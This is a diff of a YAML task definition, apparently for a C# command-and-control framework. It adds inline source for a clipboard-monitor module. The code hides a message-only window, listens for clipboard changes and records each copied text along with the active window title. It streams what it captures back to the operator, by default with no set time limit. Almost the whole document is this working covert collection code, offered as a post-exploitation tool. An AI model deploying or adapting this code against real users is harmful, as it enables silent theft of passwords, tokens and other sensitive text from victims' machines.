@@ -2156,112 +2156,203 @@
   CompatibleDotNetVersions:
   - Net35
   - Net40
-  Code: >
+  Code: |
     using System;
-
-    using SharpSploit.Enumeration;
-
+    using System.IO;
+    using System.Text;
+    using System.Runtime.InteropServices;
+    using System.Threading;
+    using System.Windows.Forms;
 
     public static class Task
-
     {
-        public static string Execute(string Seconds)
+        public static Stream OutputStream { get; set; }
+        public static string Execute(string Seconds = "0")
         {
             try
             {
-                return ClipboardMonitor.StartClipboardMonitor(Int32.Parse(Seconds));
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
+                StreamWriter stdOutWriter = new StreamWriter(OutputStream);
+                StreamWriter stdErrWriter = new StreamWriter(OutputStream);
+                stdOutWriter.AutoFlush = true;
+                stdErrWriter.AutoFlush = true;
+                Console.SetOut(stdOutWriter);
+                Console.SetError(stdErrWriter);
+
+                int time = int.Parse(Seconds);
+                string output = Clipboard.StartClipboardMonitor(time);
+
+                Console.Out.Flush();
+                Console.Error.Flush();
+                Console.SetOut(realStdOut);
+                Console.SetError(realStdErr);
+                
+                OutputStream.Close();
+
+                return "";
             }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+            catch (Exception e)
+            {
+                if (OutputStream != null)
+                {
+                  OutputStream.Close();
+                }
+                return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+            }
         }
+    }
+
+    /// <summary>
+    /// Clipboard allows for the monitoring of Clipboard text content.
+    /// </summary>
+    public class Clipboard
+    {
+        /// <summary>
+        /// Starts a clipboard monitor
+        /// </summary>
+        /// <author>Nick Muir (@_shellfarmer)</author>
+        /// <returns>String containing the captured clipboard contents, along with identification of what window they were copied from.</returns>
+        /// <param name="Seconds">The amount of time in seconds the clipboard monitor should run for before returning data.</param>
+        public static string StartClipboardMonitor(int Seconds)
+        {
+            Console.WriteLine(String.Format("[*] Starting Clipboard Monitor for {0} seconds.", Seconds));
+            Console.WriteLine();
+
+            if (Seconds <= 0)
+            {
+                NotificationForm form = new NotificationForm();
+                Application.Run(form);
+                Console.WriteLine(string.Format("[*] Finished Clipboard Monitor at {0:HH:mm:ss.fff}", DateTime.Now));
+                return "";
+            }
+            else
+            {
+                using (System.Timers.Timer timer = new System.Timers.Timer(Seconds * 1000))
+                {
+                    timer.Elapsed += (source, e) =>
+                    {
+                        Console.WriteLine(string.Format("[*] Finished Clipboard Monitor at {0:HH:mm:ss.fff}", DateTime.Now));
+                        timer.Stop();
+                        Application.Exit();
+                    };
+                    timer.Start();
+                    NotificationForm form = new NotificationForm();
+                    Application.Run(form);
+                    return "";
+                }
+            }
+        }
+
+        private class NotificationForm : Form
+        {
+            public NotificationForm()
+            {
+                SetParent(Handle, new IntPtr(-3));
+                AddClipboardFormatListener(Handle);
+            }
+
+            public string GetOutput()
+            {
+                return "";
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                if (m.Msg == 0x031D)
+                {
+                    Thread t = new Thread(() => {
+                        try
+                        {
+                            if (System.Windows.Forms.Clipboard.ContainsText())
+                            {
+                                Console.WriteLine(string.Format("[+] Collected: {0:HH:mm:ss.fff}", DateTime.Now));
+                                Console.WriteLine(string.Format("[+] Window Title: {0}", GetActiveWindowTitle()));
+                                Console.WriteLine("[+] Data:");
+                                Console.WriteLine(string.Format("{0}", System.Windows.Forms.Clipboard.GetText()));
+                                Console.WriteLine();
+                            }
+                        } catch {}
+                    });
+
+                    t.SetApartmentState(ApartmentState.STA);
+                    t.Start();
+                    t.Join();
+                }
+                base.WndProc(ref m);
+            }
+        }
+
+        /// <summary>
+        /// Gets the active window title of the window keystrokes are being entered in.
+        /// </summary>
+        /// <author>Scottie Austin (@checkymander)</author>
+        /// <returns>Title of the active window.</returns>
+        private static string GetActiveWindowTitle()
+        {
+            const int capacity = 256;
+            StringBuilder builder = new StringBuilder(capacity);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, builder, capacity) > 0)
+            {
+                return builder.ToString();
+            }
+            return null;
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetWindowText(
+            IntPtr hWnd,
+            StringBuilder text,
+            int count
+        );
     }
   TaskingType: Assembly
   UnsafeCompile: false
   TokenTask: false
   Options:
   - Name: Seconds
-    Value: 300
-    DefaultValue: '300'
-    Description: Number of seconds the collection task should run for (Default 300)
-    SuggestedValues:
-    - 300
+    Value: "0"
+    DefaultValue: "0"
+    Description: Number of seconds the collection task should run for.
+    SuggestedValues: [ "0", "10", "20", "30", "60", "120" ]
     Optional: true
     DisplayInCommand: true
     FileOption: false
-  ReferenceSourceLibraries:
-  - Name: SharpSploit
-    Description: SharpSploit is a library for C# post-exploitation modules.
-    Location: SharpSploit/SharpSploit/
-    Language: CSharp
-    CompatibleDotNetVersions:
-    - Net35
-    - Net40
-    ReferenceAssemblies:
-    - Name: System.ServiceProcess.dll
-      Location: net40/System.ServiceProcess.dll
-      DotNetVersion: Net40
-    - Name: System.IdentityModel.dll
-      Location: net40/System.IdentityModel.dll
-      DotNetVersion: Net40
-    - Name: System.Windows.Forms.dll
-      Location: net40/System.Windows.Forms.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.dll
-      Location: net40/System.DirectoryServices.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.Protocols.dll
-      Location: net40/System.DirectoryServices.Protocols.dll
-      DotNetVersion: Net40
-    - Name: System.Management.dll
-      Location: net40/System.Management.dll
-      DotNetVersion: Net40
-    - Name: System.Management.Automation.dll
-      Location: net40/System.Management.Automation.dll
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
       DotNetVersion: Net40
     - Name: System.dll
-      Location: net40/System.dll
+      Location: net40\System.dll
       DotNetVersion: Net40
     - Name: System.Core.dll
-      Location: net40/System.Core.dll
+      Location: net40\System.Core.dll
       DotNetVersion: Net40
-    - Name: mscorlib.dll
-      Location: net40/mscorlib.dll
-      DotNetVersion: Net40
-    - Name: System.XML.dll
-      Location: net35/System.XML.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.dll
-      Location: net35/System.DirectoryServices.dll
-      DotNetVersion: Net35
-    - Name: System.IdentityModel.dll
-      Location: net35/System.IdentityModel.dll
-      DotNetVersion: Net35
-    - Name: System.ServiceProcess.dll
-      Location: net35/System.ServiceProcess.dll
-      DotNetVersion: Net35
     - Name: System.Windows.Forms.dll
-      Location: net35/System.Windows.Forms.dll
-      DotNetVersion: Net35
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
     - Name: mscorlib.dll
-      Location: net35/mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.Protocols.dll
-      Location: net35/System.DirectoryServices.Protocols.dll
-      DotNetVersion: Net35
-    - Name: System.Management.dll
-      Location: net35/System.Management.dll
-      DotNetVersion: Net35
-    - Name: System.Management.Automation.dll
-      Location: net35/System.Management.Automation.dll
+      Location: net35\mscorlib.dll
       DotNetVersion: Net35
     - Name: System.dll
-      Location: net35/System.dll
+      Location: net35\System.dll
       DotNetVersion: Net35
     - Name: System.Core.dll
-      Location: net35/System.Core.dll
+      Location: net35\System.Core.dll
       DotNetVersion: Net35
-    - Name: System.XML.dll
-      Location: net40/System.XML.dll
-      DotNetVersion: Net40
-    EmbeddedResources: []
-  ReferenceAssemblies: []
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
   EmbeddedResources: []
